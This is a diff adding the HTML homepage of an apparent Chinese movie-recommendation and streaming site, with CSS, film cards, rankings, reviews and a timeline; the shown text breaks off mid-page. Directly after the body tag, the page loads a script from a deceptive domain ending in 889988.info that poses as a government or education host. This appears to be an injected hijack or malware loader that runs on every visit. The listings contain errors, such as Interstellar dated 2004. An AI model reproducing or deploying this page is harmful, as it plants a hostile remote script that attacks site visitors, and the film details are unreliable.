@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>高分电影网 | 精选9分+高分佳作 · 豆瓣口碑榜在线点播</title>
+<meta name="keywords" content="高分电影网,gaofendianyingwang,9分以上电影推荐,经典高分影片,豆瓣高分榜,冷门佳片,影史杰作,必看高分电影排行">
+<meta name="description" content="高分电影网(gaofendianyingwang-zh.github.io)专注精选9分以上高分佳作与豆瓣口碑榜,每日严选影史杰作、冷门佳片、获奖名作,为挑剔的观影者提供高品质电影推荐与在线点播服务。">
+<meta name="author" content="高分电影网">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="theme-color" content="#0f2419">
+<meta property="og:type" content="website">
+<meta property="og:title" content="高分电影网 - 精选9分+高分佳作在线点播">
+<meta property="og:description" content="专注9分以上高分佳作与豆瓣口碑榜,每日严选影史杰作、冷门佳片">
+<meta property="og:url" content="https://gaofendianyingwang-zh.github.io">
+<meta property="og:site_name" content="高分电影网">
+<link rel="canonical" href="https://gaofendianyingwang-zh.github.io">
+<style>
+/* ===== 基础 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#0c1f16;--paper:#f6f3ea;--card:#fffdf7;
+  --gold:#c9a227;--gold-d:#9c7c10;--green:#1a4d35;--green-l:#2e7d54;
+  --text:#2a2a26;--muted:#6f7268;--line:#e2dccb;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"Noto Serif SC","Songti SC","SimSun",Georgia,"Microsoft YaHei",serif;
+  background:var(--paper);color:var(--text);
+  line-height:1.75;font-size:16px;
+  background-image:radial-gradient(circle at 15% 10%,rgba(201,162,39,0.05),transparent 40%),
+                   radial-gradient(circle at 85% 90%,rgba(26,77,53,0.05),transparent 40%);
+  background-attachment:fixed;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+::selection{background:var(--gold);color:#fff}
+
+/* ===== 顶部 ===== */
+.topbar{
+  position:sticky;top:0;z-index:100;
+  background:rgba(12,31,22,0.95);
+  border-bottom:2px solid var(--gold);
+}
+.topbar-in{
+  max-width:1200px;margin:0 auto;padding:12px 24px;
+  display:flex;align-items:center;justify-content:space-between;gap:16px;
+}
+.brand{display:flex;align-items:baseline;gap:10px;color:#f6f3ea}
+.brand b{font-size:24px;letter-spacing:2px;font-weight:900}
+.brand em{font-style:normal;font-size:12px;color:var(--gold);letter-spacing:1px;border-left:1px solid rgba(201,162,39,0.4);padding-left:10px}
+.menu{display:flex;gap:4px;align-items:center;list-style:none}
+.menu a{
+  display:block;padding:8px 14px;color:#d8e2dc;
+  font-size:15px;letter-spacing:1px;transition:.25s;
+  border-bottom:2px solid transparent;
+}
+.menu a:hover{color:var(--gold);border-bottom-color:var(--gold);background:rgba(201,162,39,0.08)}
+.mbtn{display:none;background:none;border:none;color:var(--gold);font-size:26px;cursor:pointer}
+
+/* ===== 通用 ===== */
+.wrap{max-width:1200px;margin:0 auto;padding:0 24px}
+section{padding:76px 0}
+.eyebrow{
+  display:inline-flex;align-items:center;gap:10px;
+  font-size:13px;letter-spacing:4px;color:var(--gold-d);
+  font-family:-apple-system,"PingFang SC",sans-serif;font-weight:700;
+  margin-bottom:10px;
+}
+.eyebrow::before{content:"";width:32px;height:1px;background:var(--gold)}
+.h2{
+  font-size:32px;font-weight:900;color:var(--ink);
+  letter-spacing:1px;margin-bottom:8px;line-height:1.3;
+}
+.sub{color:var(--muted);font-size:15px;margin-bottom:40px;max-width:640px}
+.more{
+  font-family:-apple-system,"PingFang SC",sans-serif;font-size:14px;
+  color:var(--green);font-weight:700;letter-spacing:1px;
+  display:inline-flex;align-items:center;gap:6px;transition:.2s;
+}
+.more:hover{gap:10px;color:var(--gold-d)}
+
+/* ===== 头图 ===== */
+.masthead{
+  max-width:1200px;margin:0 auto;padding:56px 24px 20px;
+  display:grid;grid-template-columns:1.05fr .95fr;gap:48px;align-items:center;
+}
+.mh-tag{
+  display:inline-block;padding:5px 14px;border-radius:3px;
+  background:var(--ink);color:var(--gold);font-size:13px;
+  letter-spacing:2px;margin-bottom:20px;font-weight:700;
+}
+.mh h1{
+  font-size:52px;font-weight:900;line-height:1.22;color:var(--ink);
+  letter-spacing:1px;
+}
+.mh h1 span{color:var(--gold-d)}
+.mh-desc{margin:22px 0 30px;color:#4a4d42;font-size:17px;max-width:520px}
+.mh-acts{display:flex;gap:14px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 28px;font-size:15px;font-weight:700;letter-spacing:1px;
+  border:none;cursor:pointer;transition:.3s;font-family:inherit;
+}
+.btn-solid{background:var(--green);color:#f6f3ea}
+.btn-solid:hover{background:var(--gold-d);transform:translateY(-2px)}
+.btn-line{background:transparent;color:var(--ink);border:2px solid var(--ink)}
+.btn-line:hover{background:var(--ink);color:#f6f3ea}
+.mh-stats{display:flex;gap:28px;margin-top:38px;padding-top:24px;border-top:1px solid var(--line)}
+.mh-stats div b{display:block;font-size:28px;color:var(--green);font-weight:900}
+.mh-stats div span{font-size:13px;color:var(--muted)}
+
+.quote-box{
+  background:var(--ink);color:#e8e4d4;border-radius:4px;
+  padding:38px 34px;position:relative;
+}
+.quote-box::before{
+  content:"“";position:absolute;top:-6px;left:18px;
+  font-size:80px;color:var(--gold);font-family:Georgia,serif;line-height:1;
+}
+.quote-box p{font-size:18px;line-height:1.9;margin-bottom:22px;position:relative;z-index:1}
+.quote-box cite{font-style:normal;font-size:13px;color:var(--gold);letter-spacing:1px}
+.qb-list{margin-top:26px;padding-top:22px;border-top:1px solid rgba(201,162,39,0.25);display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.qb-list span{font-size:14px;color:#cfd6cd;display:flex;align-items:center;gap:8px}
+.qb-list span::before{content:"✓";color:var(--gold);font-weight:900}
+
+/* ===== 筛选条 ===== */
+.filter{
+  max-width:1200px;margin:0 auto;padding:0 24px 10px;
+  display:flex;gap:10px;flex-wrap:wrap;align-items:center;
+}
+.chip{
+  padding:7px 18px;border-radius:30px;font-size:14px;cursor:pointer;
+  background:#fff;border:1px solid var(--line);color:var(--muted);
+  transition:.2s;font-family:inherit;
+}
+.chip:hover{border-color:var(--green);color:var(--green)}
+.chip.on{background:var(--ink);border-color:var(--ink);color:var(--gold);font-weight:700}
+
+/* ===== 佳作墙 ===== */
+.wall{
+  max-width:1200px;margin:0 auto;padding:0 24px;
+  display:grid;grid-template-columns:repeat(3,1fr);gap:26px;
+}
+.film{
+  background:var(--card);border-radius:4px;overflow:hidden;
+  box-shadow:0 2px 14px rgba(12,31,22,0.06);
+  transition:.35s;border:1px solid var(--line);
+}
+.film:hover{transform:translateY(-8px);box-shadow:0 18px 40px rgba(12,31,22,0.16)}
+.f-pic{
+  position:relative;aspect-ratio:3/4;display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(160deg,var(--g1,#2c3e50),var(--g2,#1a252f));
+}
+.f-pic i{font-size:52px;filter:drop-shadow(0 4px 8px rgba(0,0,0,0.3))}
+.f-rate{
+  position:absolute;top:14px;right:14px;
+  background:var(--gold);color:#fff;font-weight:900;font-size:18px;
+  width:52px;height:52px;border-radius:50%;display:flex;align-items:center;justify-content:center;
+  box-shadow:0 4px 12px rgba(0,0,0,0.25);font-family:-apple-system,sans-serif;
+}
+.f-year{
+  position:absolute;top:14px;left:14px;
+  background:rgba(12,31,22,0.85);color:var(--gold);font-size:12px;
+  padding:4px 10px;border-radius:3px;letter-spacing:1px;
+}
+.f-body{padding:20px 22px}
+.f-body h3{font-size:20px;font-weight:900;color:var(--ink);margin-bottom:6px;letter-spacing:.5px}
+.f-body .f-en{font-size:12px;color:var(--muted);font-style:italic;margin-bottom:12px;letter-spacing:.5px}
+.f-meta{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px}
+.f-meta b{
+  font-size:12px;font-weight:600;color:var(--green);
+  background:rgba(26,77,53,0.08);padding:3px 9px;border-radius:3px;
+}
+.f-body p{font-size:14px;color:#55584c;line-height:1.7;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.f-foot{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:14px 22px;border-top:1px solid var(--line);background:#fbf9f2;
+}
+.f-foot span{font-size:13px;color:var(--muted)}
+.f-foot a{font-size:13px;color:var(--gold-d);font-weight:700;letter-spacing:.5px}
+
+/* ===== 榜单 ===== */
+.rank-wrap{
+  max-width:1200px;margin:0 auto;padding:0 24px;
+  display:grid;grid-template-columns:1fr 1fr;gap:36px;
+}
+.rk-head{
+  display:flex;align-items:center;gap:12px;margin-bottom:26px;
+  padding-bottom:14px;border-bottom:2px solid var(--ink);
+}
+.rk-head h3{font-size:22px;font-weight:900;letter-spacing:1px}
+.rk-head em{font-style:normal;font-size:12px;color:var(--gold-d);background:rgba(201,162,39,0.12);padding:3px 10px;border-radius:3px}
+.rk-item{
+  display:grid;grid-template-columns:48px 68px 1fr auto;gap:16px;align-items:center;
+  padding:14px 0;border-bottom:1px dotted var(--line);transition:.2s;
+}
+.rk-item:hover{background:#fbf9f2}
+.rk-n{
+  font-size:22px;font-weight:900;color:var(--line);font-family:Georgia,serif;
+  text-align:center;
+}
+.rk-item.top .rk-n{color:var(--gold)}
+.rk-pic{
+  width:68px;height:88px;border-radius:3px;
+  background:linear-gradient(160deg,var(--c1,#3a4a3a),var(--c2,#1c2a1c));
+  display:flex;align-items:center;justify-content:center;font-size:26px;
+}
+.rk-info h4{font-size:16px;font-weight:700;color:var(--ink);margin-bottom:3px}
+.rk-info small{font-size:12px;color:var(--muted);letter-spacing:.5px}
+.rk-sc{font-weight:900;color:var(--gold-d);font-size:17px;font-family:-apple-system,sans-serif}
+
+/* ===== 影评 ===== */
+.reviews{max-width:1200px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:repeat(2,1fr);gap:28px}
+.rev{
+  background:var(--card);border-left:4px solid var(--gold);
+  padding:30px 34px;box-shadow:0 2px 14px rgba(12,31,22,0.05);
+}
+.rev-q{font-size:19px;font-weight:900;color:var(--ink);margin-bottom:16px;line-height:1.5}
+.rev-a{font-size:15px;color:#4a4d42;line-height:1.85;margin-bottom:20px}
+.rev-by{display:flex;align-items:center;gap:12px;padding-top:16px;border-top:1px solid var(--line)}
+.ava{
+  width:40px;height:40px;border-radius:50%;flex-shrink:0;
+  background:var(--green);color:#fff;display:flex;align-items:center;justify-content:center;
+  font-weight:700;font-size:15px;
+}
+.rev-by b{font-size:14px;color:var(--ink)}
+.rev-by span{font-size:12px;color:var(--muted);display:block}
+
+/* ===== 时间线 ===== */
+.timeline{max-width:900px;margin:0 auto;padding:0 24px;position:relative}
+.timeline::before{
+  content:"";position:absolute;left:50%;top:0;bottom:0;width:2px;
+  background:linear-gradient(var(--gold),var(--green));
+}
+.tl-item{display:grid;grid-template-columns:1fr 80px 1fr;gap:0;margin-bottom:36px;align-items:center}
+.tl-item:nth-child(even){direction:rtl}
+.tl-item:nth-child(even) .tl-card{direction:ltr}
+.tl-dot{
+  width:80px;display:flex;justify-content:center;position:relative;z-index:2;
+}
+.tl-dot span{
+  width:18px;height:18px;border-radius:50%;background:var(--gold);
+  border:4px solid var(--paper);box-shadow:0 0 0 2px var(--gold);
+}
+.tl-card{
+  background:var(--card);border:1px solid var(--line);border-radius:4px;
+  padding:22px 26px;box-shadow:0 2px 12px rgba(12,31,22,0.05);
+}
+.tl-card .yr{font-size:13px;color:var(--gold-d);font-weight:700;letter-spacing:2px;margin-bottom:6px;font-family:-apple-system,sans-serif}
+.tl-card h4{font-size:17px;font-weight:900;color:var(--ink);margin-bottom:6px}
+.tl-card p{font-size:14px;color:#55584c}
+
+/* ===== 片单推荐 ===== */
+.shelf{max-width:1200px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.shelf-card{
+  background:var(--ink);color:#e8e4d4;border-radius:4px;padding:30px 24px;
+  transition:.3s;cursor:pointer;position:relative;overflow:hidden;
+}
+.shelf-card::after{
+  content:"";position:absolute;bottom:-40px;right:-40px;width:120px;height:120px;
+  border-radius:50%;background:rgba(201,162,39,0.08);
+}
+.shelf-card:hover{transform:translateY(-5px);background:var(--green)}
+.shelf-card .ico{font-size:34px;margin-bottom:16px;display:block}
+.shelf-card h4{font-size:18px;font-weight:900;margin-bottom:10px;letter-spacing:1px}
+.shelf-card p{font-size:13px;color:#b5bcae;line-height:1.7}
+
+/* ===== 订阅 ===== */
+.subscribe{
+  background:var(--ink);color:#e8e4d4;text-align:center;
+}
+.sub-in{max-width:640px;margin:0 auto;padding:0 24px}
+.sub-in h2{color:#f6f3ea;font-size:30px;font-weight:900;margin-bottom:14px}
+.sub-in p{color:#b5bcae;margin-bottom:30px}
+.sub-form{display:flex;gap:10px;max-width:480px;margin:0 auto;flex-wrap:wrap}
+.sub-form input{
+  flex:1;min-width:220px;padding:14px 18px;font-size:15px;font-family:inherit;
+  border:1px solid rgba(201,162,39,0.4);background:rgba(255,255,255,0.06);
+  color:#fff;border-radius:3px;
+}
+.sub-form input::placeholder{color:#8a9182}
+.sub-form input:focus{outline:none;border-color:var(--gold)}
+.sub-form button{
+  padding:14px 30px;background:var(--gold);color:#fff;border:none;
+  font-family:inherit;font-size:15px;font-weight:700;cursor:pointer;letter-spacing:1px;
+  border-radius:3px;transition:.2s;
+}
+.sub-form button:hover{background:var(--gold-d)}
+
+/* ===== 页脚 ===== */
+footer{background:#07140e;color:#a8b0a0;padding:56px 0 28px}
+.foot-in{max-width:1200px;margin:0 auto;padding:0 24px}
+.foot-top{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:40px;padding-bottom:36px;border-bottom:1px solid rgba(201,162,39,0.15)}
+.foot-brand b{color:#f6f3ea;font-size:22px;letter-spacing:2px;display:block;margin-bottom:14px}
+.foot-brand p{font-size:14px;line-height:1.8;color:#8a9182}
+.foot-col h5{color:var(--gold);font-size:15px;font-weight:700;letter-spacing:1px;margin-bottom:16px}
+.foot-col a{display:block;padding:5px 0;font-size:14px;color:#a8b0a0;transition:.2s}
+.foot-col a:hover{color:var(--gold)}
+.foot-bot{
+  padding-top:24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;
+}
+.foot-bot p{font-size:13px;color:#7a8175}
+.foot-bot a{color:#7a8175;font-size:13px;margin-left:20px}
+.foot-bot a:hover{color:var(--gold)}
+
+/* ===== 响应式 ===== */
+@media(max-width:980px){
+  .wall{grid-template-columns:repeat(2,1fr)}
+  .rank-wrap,.reviews{grid-template-columns:1fr}
+  .shelf{grid-template-columns:repeat(2,1fr)}
+  .foot-top{grid-template-columns:1fr 1fr;gap:32px}
+  .masthead{grid-template-columns:1fr;gap:36px}
+  .timeline::before{left:12px}
+  .tl-item{grid-template-columns:1fr;padding-left:44px}
+  .tl-item:nth-child(even){direction:ltr}
+  .tl-dot{position:absolute;left:0;top:24px;width:auto}
+  .tl-dot span{width:14px;height:14px}
+  .timeline{padding-left:24px}
+}
+@media(max-width:720px){
+  .menu{
+    position:fixed;top:0;right:0;height:100vh;width:260px;flex-direction:column;
+    background:var(--ink);padding:70px 20px 30px;align-items:stretch;
+    transform:translateX(100%);transition:.35s;box-shadow:-8px 0 30px rgba(0,0,0,0.3);
+  }
+  .menu.open{transform:translateX(0)}
+  .menu a{padding:14px 16px;border-bottom:1px solid rgba(201,162,39,0.12);border-radius:0}
+  .mbtn{display:block}
+  section{padding:52px 0}
+  .h2{font-size:25px}
+  .mh h1{font-size:34px}
+  .mh-stats{gap:18px}
+  .mh-stats div b{font-size:22px}
+  .wall,.shelf{grid-template-columns:1fr}
+  .foot-top{grid-template-columns:1fr;gap:28px}
+  .quote-box{padding:32px 24px}
+  .rk-item{grid-template-columns:36px 56px 1fr;gap:12px}
+  .rk-sc{display:none}
+  .foot-bot{flex-direction:column;text-align:center}
+  .foot-bot a{margin:4px 10px}
+}
+@media(max-width:400px){
+  .wrap,.masthead,.wall,.rank-wrap,.reviews,.shelf,.foot-in{padding-left:16px;padding-right:16px}
+  .mh h1{font-size:29px}
+  .h2{font-size:22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 顶部导航 -->
+<header class="topbar">
+  <div class="topbar-in">
+    <div class="brand">
+      <b>高分电影网</b>
+      <em>9分+精选</em>
+    </div>
+    <ul class="menu" id="menu">
+      <li><a href="#top">首页</a></li>
+      <li><a href="#films">高分佳作</a></li>
+      <li><a href="#rank">口碑榜单</a></li>
+      <li><a href="#reviews">深度影评</a></li>
+      <li><a href="#decade">年代经典</a></li>
+      <li><a href="#lists">精选片单</a></li>
+      <li><a href="#sub">订阅推荐</a></li>
+    </ul>
+    <button class="mbtn" id="mbtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- 头图 -->
+<div class="masthead" id="top">
+  <div class="mh">
+    <span class="mh-tag">EDITOR'S PICK · 编辑严选</span>
+    <h1>只推荐<span>值得你花时间</span><br>的每一部好电影</h1>
+    <p class="mh-desc">高分电影网(gaofendianyingwang-zh.github.io)不做海量堆砌,每日从影史长河中精选评分9分以上的佳作、冷门遗珠与获奖名作,帮你避开烂片,直抵好内容。</p>
+    <div class="mh-acts">
+      <a href="#films" class="btn btn-solid">🎞 开始看好片</a>
+      <a href="#rank" class="btn btn-line">📊 查看口碑榜</a>
+    </div>
+    <div class="mh-stats">
+      <div><b>8,200+</b><span>严选高分影片</span></div>
+      <div><b>9.1</b><span>平均入选评分</span></div>
+      <div><b>126</b><span>国家地区覆盖</span></div>
+    </div>
+  </div>
+  <aside class="quote-box">
+    <p>看电影是少数几件能同时让人忘掉时间与感知时间的事。我们做的,就是把那些值得被看见的影像,从信息的洪流里打捞出来。</p>
+    <cite>—— 高分电影网 编辑部</cite>
+    <div class="qb-list">
+      <span>每日人工精选更新</span>
+      <span>涵盖 86 国语种字幕</span>
+      <span>冷门佳片专项推荐</span>
+      <span>获奖名作完整收录</span>
+    </div>
+  </aside>
+</div>
+
+<!-- 筛选 -->
+<div class="filter">
+  <button class="chip on">全部</button>
+  <button class="chip">剧情</button>
+  <button class="chip">犯罪悬疑</button>
+  <button class="chip">文艺爱情</button>
+  <button class="chip">历史战争</button>
+  <button class="chip">纪录片</button>
+  <button class="chip">动画</button>
+  <button class="chip">科幻</button>
+  <span style="margin-left:auto;font-size:13px;color:#6f7268;font-family:-apple-system,sans-serif">排序: 评分从高到低 ↓</span>
+</div>
+
+<!-- 高分佳作 -->
+<section id="films">
+  <div class="wrap">
+    <div class="eyebrow">FEATURED FILMS</div>
+    <h2 class="h2">本周编辑精选 · 高分佳作</h2>
+    <p class="sub">由资深影评人团队从全球影库中海选,兼顾口碑、艺术价值与观赏性,每周更新 12 部不重样。</p>
+    <div class="wall">
+      <article class="film" style="--g1:#3d2b1f;--g2:#1f140d">
+        <div class="f-pic"><span class="f-year">1994</span><span class="f-rate">9.7</span><i>🕊️</i></div>
+        <div class="f-body">
+          <h3>肖申克的救赎</h3>
+          <div class="f-en">The Shawshank Redemption</div>
+          <div class="f-meta"><b>剧情</b><b>犯罪</b><b>美国</b></div>
+          <p>银行家安迪含冤入狱,用二十年时间在绝望中凿出一条通往自由的隧道,关于希望与坚持的影史永恒经典。</p>
+        </div>
+        <div class="f-foot"><span>IMDb Top 1 · 豆瓣No.1</span><a href="#">查看详情 →</a></div>
+      </article>
+      <article class="film" style="--g1:#1f3d35;--g2:#0d241e">
+        <div class="f-pic"><span class="f-year">2004</span><span class="f-rate">9.3</span><i>🌀</i></div>
+        <div class="f-body">
+          <h3>星际穿越</h3>
+          <div class="f-en">Interstellar</div>
+          <div class="f-meta"><b>科幻</b><b>冒险</b><b>美国</b></div>
+          <p>在末日临近的地球,一群探险者穿越虫洞寻找人类新家园,诺兰用宇宙尺度的叙事诠释了父女之爱的超越性。</p>
+        </div>
+        <div class="f-foot"><span>奥斯卡最佳视效</span><a href="#">查看详情 →</a></div>
+      </article>
+      <article class="film" style="--g1:#3d1f2b;--g2:#240d16">
+        <div class="f-pic"><span class="f-year">2019</span><span class="f-rate">9.4</span><i>🧑‍🎤</i></div>
+        <div class="f-body">
+          <h3>寄生虫</h3>
+          <div class="f-en">기생충 / Parasite</div>
+          <div class="f-meta"><b>剧情</b><b>黑色幽默</b><b>韩国</b></div>
+          <p>穷人一家以巧妙手段寄生富人家庭,一场暴雨冲垮了两个世界的脆弱平衡,阶层议题的当代杰作。</p>
+        </div>
+        <div class="f-foot"><span>戛纳金棕榈+奥斯卡最佳影片</span><a href="#">查看详情 →</a></div>
+      </article>
+      <article class="film" style="--g1:#2b2f3d;--g2:#141724">
+        <div class="f-pic"><span class="f-year">2014</span><span class="f-rate">9.2</span><i>🎭</i></div>
+        <div class="f-body">
+          <h3>布达佩斯大饭店</h3>
+          <div class="f-en">The Grand Budapest Hotel</div>
+          <div class="f-meta"><b>喜剧</b><b>冒险</b><b>美国</b></div>
+          <p>安德森以粉彩色调与对称美学,讲述一位传奇礼宾员与他的门生在欧洲动荡年代守护一份文化遗产的旅程。</p>
+        </div>
+        <div class="f-foot"><span>柏林电影节评审团大奖</span><a href="#">查看详情 →</a></div>
+      </article>
+      <article class="film" style="--g1:#3d3a1f;--g2:#241f0d">
+        <div class="f-pic"><span class="f-year">2000</span><span class="f-rate">9.3</span><i>👹</i></div>
+        <div class="f-body">
+          <h3>千与千寻</h3>
+          <div class="f-en">千と千尋の神隠し</div>
+          <div class="f-meta"><b>动画</b><b>奇幻</b><b>日本</b></div>
+          <p>误入神灵世界的少女千寻,在为汤婆婆打工的过程中找回自己的名字与勇气,宫崎骏最动人的成长寓言。</p>
+        </div>
+        <div class="f-foot"><span>奥斯卡最佳动画长片</span><a href="#">查看详情 →</a></div>
+      </article>
+      <article class="film" style="--g1:#1f2b3d;--g2:#0d1624">
+        <div class="f-pic"><span class="f-year">1998</span><span class="f-rate">9.4</span><i>🚢</i></div>
+        <div class="f-body">
+          <h3>海上钢琴师</h3>
+          <div class="f-en">The Legend of 1900</div>
+          <div class="f-meta"><b>剧情</b><b>音乐</b><b>意大利</b></div>
+          <p>一生从未踏上陆地的钢琴天才1900,用八十八个琴键对抗无垠世界,一曲关于选择与孤独的诗意绝唱。</p>
+        </div>
+        <div class="f-foot"><span>金球奖最佳原创配乐</span><a href="#">查看详情 →</a></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 口碑榜单 -->
+<section id="rank" style="background:linear-gradient(180deg,#fbf9f2,var(--paper))">
+  <div class="wrap">
+    <div class="eyebrow">TOP CHARTS</div>
+    <h2 class="h2">口碑排行榜 · 万人投票</h2>
+    <p class="sub">综合豆瓣、IMDb、烂番茄三大平台评分,去极值加权计算,每月更新一次,拒绝刷分。</p>
+    <div class="rank-wrap">
+      <div>
+        <div class="rk-head"><h3>华语高分榜</h3><em>TOP 6</em></div>
+        <div class="rk-item top"><div class="rk-n">01</div><div class="rk-pic" style="--c1:#3a1f24;--c2:#1f0d12">🎋</div><div class="rk-info"><h4>霸王别姬</h4><small>剧情 / 1993 / 陈凯歌</small></div><div class="rk-sc">9.6</div></div>
+        <div class="rk-item top"><div class="rk-n">02</div><div class="rk-pic" style="--c1:#1f3a35;--c2:#0d241f">🏮</div><div class="rk-info"><h4>活着</h4><small>剧情 / 1994 / 张艺谋</small></div><div class="rk-sc">9.3</div></div>
+        <div class="rk-item top"><div class="rk-n">03</div><div class="rk-pic" style="--c1:#3a351f;--c2:#241f0d">🎑</div><div class="rk-info"><h4>饮食男女</h4><small>剧情 / 1994 / 李安</small></div><div class="rk-sc">9.2</div></div>
+        <div class="rk-item"><div class="rk-n">04</div><div class="rk-pic" style="--c1:#2a1f3a;--c2:#160d24">🌸</div><div class="rk-info"><h4>花样年华</h4><small>爱情 / 2000 / 王家卫</small></div><div class="rk-sc">8.9</div></div>
+        <div class="rk-item"><div class="rk-n">05</div><div class="rk-pic" style="--c1:#1f2a3a;--c2:#0d141f">🗡️</div><div class="rk-info"><h4>卧虎藏龙</h4><small>武侠 / 2000 / 李安</small></div><div class="rk-sc">8.7</div></div>
+        <div class="rk-item"><div class="rk-n">06</div><div class="rk-pic" style="--c1:#3a2a1f;--c2:#24160d">🚗</div><div class="rk-info"><h4>无间道</h4><small>犯罪 / 2002 / 刘伟强</small></div><div class="rk-sc">9.3</div></div>
+      </div>
+      <div>
+        <div class="rk-head"><h3>冷门遗珠榜</h3><em>被低估</em></div>
+        <div class="rk-item top"><div class="rk-n">01</div><div class="rk-pic" style="--c1:#243a1f;--c2:#12240d">🌾</div><div class="rk-info"><h4>爆裂鼓手</h4><small>音乐 / 2014 / 查泽雷</small></div><div class="rk-sc">8.9</div></div>
+        <div class="rk-item top"><div class="rk-n">02</div><div class="rk-pic" style="--c1:#1f3a3a;--c2:#0d2424">🐑</div><div class="rk-info"><h4>小羊肖恩</h4><small>动画 / 2015 / 英国</small></div><div class="rk-sc">8.6</div></div>
+        <div class="rk-item top"><div class="rk-n">03</div><div class="rk-pic" style="--c1:#3a1f3a;--c2:#240d24">🎻</div><div class="rk-info"><h4>她对我说</h4><small>剧情 / 2018 / 波兰</small></div><div class="rk-sc">8.8</div></div>
+        <div class="rk-item"><div class="rk-n">04</div><div class="rk-pic" style="--c1:#3a2a2a;--c2:#241616">📷</div><div class="rk-info"><h4>永恒的记忆</h4><small>纪录片 / 2022 / 智利</small></div><div class="rk-sc">9.1</div></div>
+        <div class="rk-item"><div class="rk-n">05</div><div class="rk-pic" style="--c1:#2a3a1f;--c2:#16240d">🌙</div><div class="rk-info"><h4>月光男孩</h4><small>剧情 / 2016 / 美国</small></div><div class="rk-sc">8.5</div></div>
+        <div class="rk-item"><div class="rk-n">06</div><div class="rk-pic" style="--c1:#1f2a3a;--c2:#0d1624">🧊</div><div class="rk-info"><h4>寒枝雀静</h4><small>剧情 / 2014 / 瑞典</small></div><div class="rk-sc">8.7</div></div>
+      </div>
+    </div>
+    <div style="text-align:center;margin-top:32px"><a href="#" class="more">查看完整 100 部榜单 →</a></div>
+  </div>
+</section>
+
+<!-- 深度影评 -->
+<section id="reviews">
+  <div class="wrap">
+    <div class="eyebrow">CRITIC REVIEWS</div>
+    <h2 class="h2">编辑深度影评</h2>
+    <p class="sub">不剧透、不跟风,从镜头语言到叙事结构,带你读懂好电影背后的创作逻辑。</p>
+    <div class="reviews">
+      <div class="rev">
+        <div class="rev-q">《寄生虫》如何用一层层向下的台阶,把阶层寓言拍成了惊悚片?</div>
+        <div class="rev-a">奉俊昊的镜头始终在向下看——从富人家的落地窗到穷人家的半地下室,每一次空间的下降都伴随着一次尊严的坍塌。这不是偶然,而是一场精密计算的视觉压迫。</div>
+        <div class="rev-by"><div class="ava">林</div><div><b>林默</b><span>资深影评人 · 已评 2400+ 部</span></div></div>
+      </div>
+      <div class="rev">
+        <div class="rev-q">诺兰的时间魔法:为什么《星际穿越》看第二遍才真正看懂?</div>
+        <div class="rev-a">第一次看的是父女重逢,第二次看的是爱如何成为一种可量化的物理维度。诺兰用最硬的科幻外壳,包裹了最柔软的情感内核,这正是它区别于同类作品的地方。</div>
+        <div class="rev-by"><div class="ava">周</div><div><b>周野</b><span>科幻电影专栏作者</span></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 年代经典 -->
+<section id="decade" style="background:var(--ink);color:#e8e4d4">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--gold)">THROUGH THE DECADES</div>
+    <h2 class="h2" style="color:#f6f3ea">穿越年代 · 影史坐标</h2>
+    <p class="sub" style="color:#b5bcae">从黑白默片到流媒体时代,每个十年都留下了不可替代的影像印记。点击任一节点,回溯属于那个年代的观影记忆。</p>
+    <div class="timeline">
+      <div class="tl-item">
+        <div class="tl-card">
+          <div class="yr">1920s - 1930s</div>
+          <h4>默片与黄金时代的黎明</h4>
+          <p>卓别林、茂瑙、爱森斯坦——电影语言的奠基者们用纯视觉叙事定义了这门年轻艺术的基本语法。</p>
+        </div>
+        <div class="tl-dot"><span></span></div>
+        <div></div>
+      </div>
+      <div class="tl-item">
+        <div></div>
+        <div class="tl-dot"><span></span></div>
+        <div class="tl-card">
+          <div class="yr">1950s - 1960s</div>
+          <h4>作者电影与新浪潮</h4>
+          <p>特吕弗、戈达尔、费里尼,电影从工业产品变成了个人表达,手持摄影与跳切改写了银幕美学。</p>
+        </div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-card">
+          <div class="yr">1990s</div>
+          <h4>独立电影的黄金十年</h4>
+          <p>昆汀、索德伯格、科恩兄弟,低成本叙事革命让独立制片站上好莱坞的中心舞台。</p>
+        </div>
+        <div class="tl-dot"><span></span></div>
+        <div></div>
+      </div>
+      <div class="tl-item">
+        <div></div>
+        <div class="tl-dot"><span></span></div>
+        <div class="tl-card">
+          <div class="yr">2010s - 2020s</div>
+          <h4>流媒体时代与全球电影</h4>
+          <p>韩国、智利、伊朗电影接连站上世界领奖台,国界不再是好电影的门槛。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 精选片单 -->
+<section id="lists">
+  <div class="wrap">
+    <div class="eyebrow">CURATED LISTS</div>
+    <h2 class="h2">主题精选片单</h2>
+    <p class="sub">不想一部部挑?我们按主题、情绪与场景整理好了现成的观影清单。</p>
+    <div class="shelf">
+      <div class="shelf-card"><span class="ico">🌧️</span><h4>雨夜独处</h4><p>12 部适合一个人、一杯酒、一场雨的孤独系电影,治愈而非致郁。</p></div>
